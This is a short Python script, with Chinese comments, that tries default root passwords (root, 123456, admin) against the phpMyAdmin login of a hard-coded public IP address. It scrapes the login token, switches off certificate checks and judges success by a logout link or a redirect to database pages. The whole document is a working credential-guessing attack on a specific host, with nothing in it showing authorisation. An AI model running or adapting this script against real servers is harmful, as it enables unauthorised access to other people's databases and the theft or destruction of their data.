#!/usr/bin/env python3
"""phpMyAdmin登录详细检查"""
import urllib.request, http.cookiejar, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "http://39.105.7.208:8980/phpmyadmin"

def try_login(user, pw):
    cj.clear()
    r = op.open(f"{B}/", timeout=10)
    html = r.read().decode("utf-8","ignore")
    m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
    token = m.group(1) if m else None
    print(f"token={token[:20] if token else None}", flush=True)
    data = f"pma_username={user}&pma_password={pw}&server=1&token={token}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/index.php", data=data), timeout=10)
        body = r.read().decode("utf-8","ignore")
        print(f"登录响应: url={r.geturl()} len={len(body)}", flush=True)
        print(f"  header: {r.headers.get('Location')}", flush=True)
        # 关键判断
        if "logout" in body:
            print(f"  >>> 含logout=登录成功!", flush=True)
            return "SUCCESS"
        if "db_structure" in r.geturl() or "server_sql" in r.geturl():
            print(f"  >>> 跳转到数据库页=登录成功!", flush=True)
            return "SUCCESS"
        print(f"  页面标题: {re.search(r'<title>([^<]*)</title>', body).group(1) if re.search(r'<title>([^<]*)</title>', body) else '?'}", flush=True)
    except Exception as e:
        print(f"  ERR: {str(e)[:60]}", flush=True)
    return "?"

for user, pw in [("root","root"),("root","123456"),("root","admin")]:
    print(f"--- {user}/{pw} ---", flush=True)
    r = try_login(user, pw)
    if r == "SUCCESS": break
